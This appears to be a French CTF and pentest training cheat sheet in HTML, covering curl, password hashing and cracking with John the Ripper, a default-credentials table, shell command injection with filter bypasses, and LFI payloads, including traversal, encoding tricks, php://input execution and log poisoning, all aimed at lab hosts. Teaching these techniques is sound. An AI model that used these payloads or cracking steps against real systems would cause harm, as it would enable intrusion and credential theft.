+Ne pas oublier de mettre l'url entre 'cotes'<br>
+Exemple:</p>
+<pre><code>$ curl 'http://localhost:8001/register.php?name=jean&amp;lastname=bon&amp;age=42&amp;admin=true'
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormPostJSon">FORM: données au format JSON</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Dans les formulaires élaborés, les données sont validées en Java Script avant d'être envoyées, au bon format au serveur.<br>
+JavaScript utilise nativement le format JSON pour envoyer des structures de données structurées.<br>
+Exemple: {key1:value1, key2:value2}.<br>
+Dans ce cas, l'entête Content-Type précise le type de données: Content-Type: application/json<br></p>
+<p>Exemple:</p>
+<pre><code>POST / HTTP/1.1
+Host: localhost:8001
+User-Agent: curl/7.58.0
+Accept: */*
+Content-Type: application/json
+Content-Length: 34
+
+{"key1":"value1", "key2":"value2"}
+</code></pre>
+<p>Curl :</p>
+<pre><code>$ curl --header "Content-Type: application/json" -X POST --data  '{"key1":"value1", "key2":"value2"}' http://10.10.1.11/
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormPostFile">FILE: Upload</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les formulaires sont généralement utilisés pour s'enregister, se connecter ou d'uploader des fichiers.<br>
+Des contrôles sur les fichiers uploadés peuvent être fait en javascript sur le client, ou sur le serveur.<br>
+On vérifie souvent la taille, le nom, l'extension du fichier, et parfois son header.<br>
+Un chapitre entier du guide est dédié à l'upload de nos shells.<br>
+<br>
+Un champ de type Fichier est caractérisé par le code HTML </p>
+<pre><code>&lt;input type=file name=fileToUpload&gt;:
+</code></pre>
+<p>Commande curl</p>
+<pre><code>curl -X POST -F 'fileToUpload=@./picture.jpg' http://10.10.1.11/upload
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=HTTPFormCookies">Curl: Sauver et modifier des cookies</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les cookies servent à stocker des valeurs sur le navigateur qui seront reutilisées entre deux sessions.<br>
+Ils peuvent contenir des choix de langue, couleurs, et parfois d'authentification...<br>
+<br>
+Lire les cookies envoyés par le serveur et les stocker dans un cookie jar.</p>
+<pre><code>$ curl  -c cookies.txt http://10.10.1.11/cookies.php
+</code></pre>
+<p>Envoyer un cookie sauvegardé, et sauver la nouvelle valeur</p>
+<pre><code>$ curl -b cookies.txt -c cookies.txt http://10.10.1.11/cookies.php
+</code></pre>
+<p>Envoyer un cookie manuellement</p>
+<pre><code>$ curl -b 'code=1447' http://10.10.1.11/cookies.php
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Passwords">Passwords
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=password">Deviner un mot de passe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Quand il faut choisir un mot de passe, ça tombe toujours au plus mauvais moment.<br>
+Et comme, en plus, il faut s'en souvenir... les mots de passe sont souvent basés sur des notions simples: prénom, marque, souvenir...<br>
+<br>
+Heureusement, les responsables de la sécurité imposent des politiques de gestion des mots de passe, conçues pour éviter ces dérives... <br>
+Enfin, il faut le dire vite ;)<br>
+Dans 90% des cas, la majuscule est en début de mot de passe, les chiffres et le caractère spécial à la fin...<br>
+Evitez d'utiliser Vacances12! comme mot de passe...</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=rockyou">Liste de mots de passe : Rockyou.txt</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>RockYou, une société basée en Californie, permettait de s'authentifier sur des application facebook sans avoir à saisir de mots de passe. En décembre 2009, elle s'est fait hacker. <br>
+<br>
+La base de données contenant les noms et mots de passe en clair de ses 32 millions de clients a été volée puis rendue publique.<br>
+Une analyse des mots de passe à montré que les deux tiers des mots de passe faisaient moins de 6 caractères, et que le mot de passe le plus utilisé était 123456.<br>
+<br>
+Cette liste des mots de passes, triés par fréquence est fréquement utilisée dans les CTF.<br>
+Sur Kali, le fichier, zippé, est rangé en : /usr/share/wordlists/rockyou.zip<br>
+Dans le terminal, pour prendre de bonnes habitudes, le fichier est rangé en : /usr/share/wordlists/rockyou.txt<br>
+<br>
+<a href="/rockyou.txt" target="_null">fichier de mots de passe Rockyou: rockyou.txt</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=fuite">Firefox Monitor</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Pour savoir si ton adresse email est présente dans une fuite de donnée, tu peux utiliser le service de Firefox Monitor.<br>
+<a href="https://monitor.firefox.com/">https://monitor.firefox.com/</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=hash">Hash</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un professionnel ne garde jamais un mot de passe en clair. <br>
+Il enregistre un Hash.<br>
+<br>
+Un Hash est généré par une fonction mathématique à partir du mot de passe de l'utilisateur. <br>
+Quand l'utilisateur saisit son mot de passe, le logiciel calcule le Hash et le transmet au serveur qui le compare avec le Hash qu'il a stocké.
+Si les deux Hash coincident, alors l'utilisateur connait le mot de passe, et est authentifié.<br>
+Si un curieux sniffe les messages, il ne verra pas le mot de passe, juste le Hash.<br>
+Connaissant le Hash, il est compliqué de retrouver le mot de passe.<br>
+<br>
+Pour calculer un Hash du mot de passe '123456' avec la fonction MD5, utilise la commande suivante dans le terminal :<br>
+$ printf '123456' | md5sum<br>
+123456 donnera toujours le même Hash MD5.<br>
+<br>
+La fonction MD5 a été très utilisée par le passé, mais la puissance des processeurs actuels impose l'utilisation de fonctions plus complexes à craquer comme SHA1, SHA256 ou SHA512.<br>
+La taille du Hash augmente avec la complexité de l'algorithme.<br>
+<br>
+printf '123456' | sha1sum<br>
+7c4a8d09ca3762af61e59520943dc26494f8941b<br>
+<br>
+printf '123456' | sha256sum<br>
+8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92 <br>
+<br>
+Note: on utilise 'printf' et pas 'echo' pour un calcul de Hash. Echo ajoute un saut de ligne qui est pris en compte par le Hash.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=hash">Salt</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les Hash plus longs sont plus compliqués à casser, mais il est toujours possible de pré-calculer les valeurs de listes comme RockYou.<br>
+<br>
+Pour éviter le précalcul des Hash, nous utilisons des Salts.<br>
+Ce sont des valeurs supplémentaires que l'on ajoute au début du mot de passe avant de calculer le Hash.<br>
+La vérification du Hash reste rapide, mais les tables pré-calculées deviennent inutiles, il faut les recalculer pour chaque Salt.<br>
+<br>
+Calculer le hash de 123456 avec le Salt ABCDE et la fonction de Hash MD5 en python:</p>
+<pre><code>$ python3 -c "import crypt; print(crypt.crypt('123456', '$1$ABCDE$'))"
+</code></pre>
+<p>Avec openssl: -1: MD5 password, -5:SHA256 and -6:SHA512</p>
+<pre><code>$ openssl passwd -1 -salt ABCDE  123456
+</code></pre>
+<p>Le résultat est : $1$ABCDE$Kn5RIMYO1QXy7GtJysNSC1<br>
+Il est composé de 3 champs : <br>
+$1 : la fonction utilisée est MD5 ($5 SHA256, $6 SHA512)<br>
+$ABCDE : le Salt<br>
+$Kn5RIMYO1QXy7GtJysNSC1 : le Hash calculé en ajoutant le Salt<br></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=hashonline">Online Hash crack</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Use online services to crack hash:<br></p>
+<ul>
+<li>Crackstation : <a href="https://crackstation.net/">https://crackstation.net/</a></li>
+</ul>
+<p>Try: e10adc3949ba59abbe56e057f20f883e</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=etcpasswd">/etc/passwd</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le fichier /etc/passwd est un fichier texte dont chaque ligne décrit un compte d'utilisateur.<br>
+Chaque ligne se compose de sept champs séparés par un deux-points. <br>
+Voici un exemple d'un enregistrement :<br></p>
+<pre><code>jsmith:x:1001:1000:Joe Smith,Room 1007,(234)555-8910,(234)5550044,email:/home/jsmith:/bin/sh
+</code></pre>
+<p>Les champs, de gauche à droite, sont :<br>
+<br></p>
+<ul>
+    <li>jsmith : le nom de l'utilisateur (login name). </li>
+    <li>x : un x signifie que le hash du mots de passe est stocké, dans le fichier /etc/shadow qui n'est lisible que par le compte 'root'. Un * empêche les connexions d'un compte tout en conservant son nom d'utilisateur. Dans les premières version d'unix, ce champ contenait le hachage cryptographique du mot de passe de l'utilisateur.</li>
+    <li>1001 : l'identifiant d'utilisateur.</li>
+    <li>1000 : l'identifiant de groupe. Un nombre qui identifie le groupe principal de l'utilisateur. </li>
+    <li>Joe Smith,Room 1007,(234)555-8910,(234)5550044,email : le champ Gecos. Un commentaire qui décrit la personne ou le compte. Généralement, il s'agit d'un ensemble de valeurs séparées par des virgules, fournissant le nom complet de l'utilisateur et ses coordonnées.</li>
+    <li>/home/jsmith : le chemin vers le répertoire personnel de l'utilisateur.</li>
+    <li>/bin/sh : le programme qui est lancé chaque fois que l'utilisateur se connecte au système. Peut être nologin.</li>
+</ul>
+<p>Les premières lignes du fichier sont généralement des comptes systèmes.<br>
+Les comptes utilisateurs sont souvent décrits dans les dernière lignes.<br>
+Ce fichier permet d'identifier rapidement les utlisateurs, les applications (tomcat, mysql, www_data,...), leurs répertoires de travail, et s'ils ont ou non accès à un shell.<br>
+<a href="https://fr.wikipedia.org/wiki/Passwd">Article sur Wikipedia: </a><a href="https://fr.wikipedia.org/wiki/Passwd">https://fr.wikipedia.org/wiki/Passwd</a></p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=john">Hash crack: John the ripper</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>John The ripper permet de vérifier si un hash correspond à un mot de passe présent dans une liste.<br>
+<br>
+Enregistrer un ou plusieurs Hash dans le fichier hash.txt </p>
+<pre><code>$ echo 'root:$1$1337$WmteYFHyEYyx2MDVXln7Y1' &gt;hash.txt
+$ echo 'wordpressuser1:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0' &gt;&gt;hash.txt</code></pre>
+<p>Utiliser John the ripper pour casser le mot de passe en se servant sa liste de mots de passe interne: </p>
+<pre><code>$ john hash.txt</code></pre>
+<p>Utiliser John the ripper pour casser le mot de passe en se servant de la liste Rockyou:  </p>
+<pre><code>$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt</code></pre>
+<p>John n'affiche plus les mots de passe qu'il a déjà cassé.<br>
+Pour afficher ces mots de passe:  </p>
+<pre><code>$ john hash.txt --show </code></pre>
+<p>Il existe plusieurs version de John sur Internet.
+Les distributions Kali et Parrot, installent la version John Community Enhanced -jumbo.
+Cette distribution est disponible en <a href="https://github.com/openwall/john">https://github.com/openwall/john</a></p>
+<pre><code>$ sudo snap install john-the-ripper
+$ john
+John the Ripper 1.9.0-jumbo-1 OMP [linux-gnu 64-bit 64 AVX2 AC]</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=johnshadow">John - /etc/passwd /etc/shadow</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Bruteforcer /etc/shadows avec John:<br></p>
+<pre><code>$ unshadow /etc/passwd /etc/shadow &gt; hash.txt  
+$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt 
+$ john hash.txt --show 
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=johnmysql">John - MySQL Hash</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Bruteforcer un hash My SQL avec John:<br></p>
+<pre><code>mysql -u dbuser -p drupaldb 
+ show databases; 
+ show tables; 
+ select name, pass from users; 
+ exit 
+ -------+---------------------------------------------------------+ 
+ | name  | pass                                                    | 
+ +-------+---------------------------------------------------------+ 
+ |       |                                                         | 
+ | admin | $S$DvQI6Y6xxxxxxxxxxxxxxxxxxxxxxxxxEDTCP9nS5.i38jnEKuDR | 
+ | Fxxxx | $S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg | 
+ | ..... | $S$Drpxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx/x/4ukZ.RXi | 
+ +-------+---------------------------------------------------------+ 
+
+echo '$S$DWGrxefxxxxxxxxxxxxxxxxxxxxxxxxxxxx3QBwC0EkvBQ/9TCGg'&gt;hash.txt 
+$ john hash.txt --wordlist=/etc/share/wordlists/rockyou.txt 
+$ john hash.txt --show 
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=johnsshrsa">John - Password protected SSH RSA Key</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Bruteforce a pasword protected id_rsa id (id used for ssh connections):<br>
+<br>
+RSA header:</p>
+<pre><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25325A9B318F344B8391AFD767D6D
+
+NhAAAAAwEAAQAAAgEA4hHFXkYNJLp47GZdP1LEJ3rueKhu4c9SCqzbeJfaWUJY/nZSmV76
+<pre><code>
+Let check if the password is in the Rockyou list.
+</code></pre>
+$ python  /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+$ john hash.txt --show 
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=defaultpasswords">Default password</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Many software and equipment are installed with default configurations and passwords.<br>
+Very often, these passwords are not changed..<br></p>
+<pre><code>Vendor          Username      Password
+------          --------      --------
+Raspberrypi     pi            raspberry
+3COM            BLANK         12345
+APACHE          admin         jboss4
+Apache          admin         tomcat
+Apache          tomcat        tomcat
+Adobe           admin         admin
+Airlink         BLANK         admin
+Apple           admin         public
+Belkin          admin         none
+Borland         politically   correct
+Bunker OS       BLANK         123456
+Cisco           EAdmin        BLANK
+Cisco           BLANK         Cisco
+D-Link          BLANK         private
+Del             Administrator storageserver
+Edimax          admin         123
+F5              admin         admin
+kali            kali          kali 
+Netgear         BLANK         password
+parrot          user          toor 
+Raspberrypi     pi            raspberry
+ubuntu          user          BLANK
+
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Injection_de_commandes_Shell">Injection de commandes Shell
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=CommandPrinciple">Command Injection: Principe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>L'injection de commande Shell est possible quand un programme utilise une donnée, entrée par l'utilisateur, sans la filtrer, comme argument d'une commande shell.</p>
+<p>Par exemple: un formulaire permet de saisir son nom et l'afficher.
+Le code coté serveur va ressembler à: </p>
+<pre><code>system ('echo '.$NAME);
+</code></pre> 
+<p>Si nous saisissons: </p>
+<pre><code>YOLO; cat /etc/password;
+</code></pre> 
+<p>Le serveur va enchainer les deux commandes en executant:</p>
+<pre><code>system ('echo YOLO; cat /etc/password;'); 
+</code></pre> 
+<p>Nous allons récupérer le contenu du fichier passwd.</p>
+<p>Avec une injection de commande nous avons la main sur le serveur.
+Nous pouvons récupérer des informations sur le serveur (uname -a), recupérer des noms de comptes (cat /etc/passwd), récupérer les fichiers de config du serveur web, lancer un reverse shell...</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=CommandChainUx">Unix: Enchainer deux commandes shell</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Utiliser les séparateurs de commandes ; &amp;&amp; | ||</p>
+<pre><code>echo YOLO; cat /etc/passwd
+echo YOLO &amp;&amp; cat /etc/passwd
+echo YOLO | cat /etc/passwd
+echo YOLO || cat /etc/passwd    Seulement si la première commande est en echec
+</code></pre> </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=CommandEvalUx">Unix: Force command execution in a string</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Il est possible de forcer l'execution d'une commande avec ` $ et {</p>
+<pre><code>echo `cat /etc/passwd`
+echo $(cat /etc/passwd)
+echo {cat,/etc/passwd}
+</code></pre> </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=CommandSpaceFilteres">Bypass: Les espaces sont filtrés</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les développeurs peuvent avoir mis des filtres pour empécher l'execution de commande. Par exemple retirer les espaces. Néanmoins, même sans espaces, il est toujours possible de lancer lancer des commandes:</p>
+<pre><code>cat&lt;/etc/passwd
+{cat,/etc/passwd}
+X=$'cat\x20/etc/passwd'&amp;&amp;$X
+</code></pre> </div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=CommandBlacklist">Bypass: Certains mot clefs sont filtrés</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si un filtre recherche une liste de commandes, il est toujours possible de le contourner: simple quote, double quote, backslash et slash</p>
+<pre><code>c'a't /etc/passwd
+cat /etc/passwd
+c\at /etc/passwd
+who``ami
+</code></pre> 
+<p>Et si un nom de fichier est filtré, il est possible de multiplier les /
+Filtre sur cat et /etc/passwd</p>
+<pre><code>c\at /etc////////passwd
+</code></pre> </div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Inclusion_de_Fichier_Local_(LFI)">Inclusion de Fichier Local (LFI)
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFI">LFI</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>De nombreux langages de programmations, comme le php, sont capable de lire des fichiers et les interpréter pour générer des pages HTML dynamiques.<br>
+Cette fonction peut être détournée si elle prend en entrée une variable modifiable par l'utilisateur.<br>
+<br>
+Par exemple:<br>
+L'url <a href="http://10.10.10.11/index.php?page=login.php">http://10.10.10.11/index.php?page=login.php</a> est envoyée au serveur.<br>
+A la réception de cette requête, le serveur va inclure le fichier 'login.php', et l'éxécuter pour générer la page de login.<br>
+<br>
+Nous allons remplacer 'login.php' par le nom d'un autre fichier, par exemple '/etc/passwd'.<br></p>
+<pre><code>http://10.10.10.11/index.php?page=/etc/passwd</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=FLI..">LFI: Accéder à /</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le serveur web apache fonctionne généralement dans le répertoire /var/www/html.<br>
+Si nous précisons page=/etc/passwd, le serveur risque de chercher le fichier /var/www/html/etc/passwd. <br>
+Nous utilisons alors /../ pour remonter d'un répertoire.<br></p>
+<pre><code>/var/www/html/../etc/passwd =&gt; /var/www/etc/passwd.
+/var/www/html/../../etc/passwd =&gt; /var/etc/passwd.
+</code></pre>
+<p>Nous utilisons une série de ../../../../../ devant le nom du fichier pour forcer le serveur à redescendre au niveau de la racine des répertoires.<br>
+/var/www/html/../../../../../../../ vaut /, quel que soit le nombre de ../<br></p>
+<pre><code>http://10.10.10.11?page=../../../../../etc/passwd
+</code></pre>
+<p>Une LFI permet de lire TOUS les fichiers de la machine accessible au compte du serveur web.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFINull">NUll byte</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le serveur extrait le paramètre 'page' de la requète <a href="http://10.10.10.11/index.php?page=login">http://10.10.10.11/index.php?page=login</a>, et ajoute l'extension '.php' avant d'inclure le fichier.<br>
+<br>
+<a href="http://10.10.10.11/index.php?page=/etc/password">http://10.10.10.11/index.php?page=/etc/password</a> va essayer d'ouvrir sans success /etc/password.php.<br>
+<br>
+Sur les version de php antérieures à 5.3.4, l'ajout d'un null byte à la fin de notre paramètre va signifier la fin de la chaine de caractère, et conduit à ignorer l'extension '.php'.<br></p>
+<pre><code>http://10.10.10.11/index.php?page=/etc/password%00
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFIURLDoubleEncodage">Double encodage d'URL</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>&lt;   %3C %253C
+&gt;   %3E %253E
+«   %22 %2522
+‘   %27 %2527
+/   %2F %252F
+.   %2E %252E
+=   %3D %253D
+–   %2D %252D
+:   %3A %253A</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFIWaf">WAF: Filtres applicatifs</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les développeurs ayant conscience des risques de LFI peuvent ajouter des fonctions qui vont filtrer les entrées.<br>
+Ils vont supprimer les ../ et les / dans le nom du fichier<br>
+Ce genre de filtre s'appelle un Waf : Web Application Filter.<br>
+<br>
+Il est possible de contourner ces filtres de plusieures manières:<br></p>
+<ul>
+<li>En prévoyant que des suites de caractères seront filtrés: ..././ une fois filtré va donner ../<br>
+<a href="http://10.10.10.11/index.php?page=..././..././..././..././passwd">http://10.10.10.11/index.php?page=..././..././..././..././passwd</a><br>
+<br></li>
+<li>En utilisant un encodage url:<br>
+../ devient %2e%2e%2f<br>
+/ devient %2f<br>
+<a href="http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd">http://10.10.10.11/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</a><br><br>
+<br></li>
+<li>En utilisant un double encodage url:<br>
+../ devient %2e%2e%2f qui lui même devient %252e%252e%252f<br>
+/ devient %252f<br>
+<a href="http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword">http://10.10.10.11/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpassword</a><br>
+<br>
+Même si généralement les navigateurs ne ralent pas trop, ils peuvent interpréter les caractères encodés voire les réencoder. Il est souvent préférable de modifier l'URL dans une command curl ou un proxy plutôt que dans le navigateur.</li>
+</ul></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFIphpfilter">Php:filter : Recupérer les codes sources php</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le langage php offre la possibilité de passer les fichiers dans des filtres avant de les ouvrir. Il est ainsi possible d'encoder un fichier en base64 avant de l'ouvrir.</p>
+<pre><code>http://10.10.10.11/index.php?page=php://filter/read=convert.base64-encode/resource=login.php 
+http://10.10.10.11/index.php?page=php://filter/convert.base64-encode/resource=login.php </code></pre>
+<p>Il ne reste plus qu'à décoder pour obtenir le code source du fichier php.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=LFIphpinput">Php:input : Injecter du code via un Post HTTP</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le langage php permet de traiter le contenu de la requête HTTP comme un fichier. Il est ainsi possible de lire et faire executer le contenu brut des données en POST avec php://input.<br></p>
+<p>curl  -X POST -d 'test=&lt;? system ("id"); ?&gt;' <a href="http://pwnlab/?page=php://input">http://pwnlab/?page=php://input</a><br>
+<br>
+Ne fonctionne que si l'option allow_url_include = On est active dans la config php. Cette option est désactivée par défaut.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=FLILog">Exploitation des logs</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Pour injecter une payload Php dans le fichier de logs d'un serveur web, il suffit de faire une requête de type HTTP GET contenant du code php dans l'url.<br>
+Pour un serveur ftp ou ssh, injecter la payload dans le login.
+Nous utilisons ensuite une LFI sur le fichier de log pour déclencher l'execution de la payload.<br>
+<br>
+Fichiers de logs usuels:<br>
+Apache<br>
+/var/log/apache/access.log<br>
+/var/log/apache/error.log<br>
+/usr/local/apache/log/error_log<br>
+/usr/local/apache2/log/error_log<br>
+/var/log/httpd/error_log<br>
